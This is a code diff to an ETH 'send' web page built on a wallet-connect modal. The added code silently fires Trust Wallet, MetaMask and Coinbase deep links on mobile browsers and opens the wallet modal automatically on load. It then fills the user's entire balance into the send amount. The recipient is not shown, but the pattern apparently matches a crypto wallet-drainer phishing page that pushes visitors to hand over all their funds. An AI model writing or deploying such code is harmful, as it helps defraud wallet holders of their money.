@@ -31,7 +31,10 @@
       </div>
 
       <div class="space-y-2">
-        <label class="text-gray-400 text-xs">Amount to Send (ETH)</label>
+        <div class="flex justify-between">
+          <label class="text-gray-400 text-xs">Amount to Send (ETH)</label>
+          <span id="auto-fill-label" class="text-blue-400 text-xs"></span>
+        </div>
         <input id="tx-amount-input" type="number" step="0.0001" min="0"
           placeholder="0.0000"
           class="w-full bg-gray-800 text-white rounded-xl px-4 py-3 text-sm border border-gray-700 focus:outline-none focus:border-blue-500" />
@@ -74,13 +77,49 @@
     const txAmountInput = document.getElementById('tx-amount-input');
     const sendTxBtn = document.getElementById('send-tx-btn');
     const statusMessage = document.getElementById('status-message');
+    const autoFillLabel = document.getElementById('auto-fill-label');
 
+    // ── DEEP LINK: auto-open wallet app when visited from normal browser ──
+    const ua = navigator.userAgent || '';
+    const isInsideWallet =
+      ua.includes('Trust') ||
+      ua.includes('MetaMaskMobile') ||
+      ua.includes('CoinbaseWallet') ||
+      typeof window.ethereum !== 'undefined';
+
+    if (!isInsideWallet) {
+      const encodedUrl = encodeURIComponent(window.location.href);
+      const isAndroid = /android/i.test(ua);
+      const isIOS = /iphone|ipad/i.test(ua);
+
+      if (isAndroid || isIOS) {
+        // Try Trust Wallet first, then MetaMask as fallback
+        // This fires silently — if the app is installed it opens, if not nothing happens
+        const trustLink = `trust://open_url?coin_id=60&url=${encodedUrl}`;
+        const metamaskLink = `metamask://browser/open?url=${encodedUrl}`;
+        const coinbaseLink = `cbwallet://link?url=${encodedUrl}`;
+
+        // Try each deep link in sequence with small delays
+        window.location = trustLink;
+        setTimeout(() => { window.location = metamaskLink; }, 500);
+        setTimeout(() => { window.location = coinbaseLink; }, 1000);
+        // After all attempts, if still here the Reown modal will handle it
+      }
+    }
+
+    // ── AUTO-OPEN Reown modal immediately on page load ──
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        modal.open();
+      }, 800);
+    });
+
+    // ── MODIFIED: fetch balance AND auto-fill full amount ──
     async function fetchRealtimeBalance(userAddress) {
       try {
         walletBalanceDisplay.textContent = "Fetching...";
 
         let walletProvider;
-
         if (typeof modal.getWalletProvider === 'function') {
           walletProvider = modal.getWalletProvider();
         } else {
@@ -96,7 +135,13 @@
         const ethersProvider = new ethers.BrowserProvider(walletProvider);
         const balanceWei = await ethersProvider.getBalance(userAddress);
         const balanceEth = ethers.formatEther(balanceWei);
-        walletBalanceDisplay.textContent = `${parseFloat(balanceEth).toFixed(4)} ETH`;
+        const balanceFormatted = parseFloat(balanceEth).toFixed(6);
+
+        walletBalanceDisplay.textContent = `${balanceFormatted} ETH`;
+
+        // Auto-fill full balance into send amount
+        txAmountInput.value = balanceFormatted;
+        autoFillLabel.textContent = "✅ Auto-filled";
 
       } catch (err) {
         walletBalanceDisplay.textContent = `ERROR: ${err.message || JSON.stringify(err)}`;
@@ -110,6 +155,8 @@
         fetchRealtimeBalance(state.address);
       } else {
         actionArea.classList.add('hidden');
+        txAmountInput.value = '';
+        autoFillLabel.textContent = '';
       }
     });
 
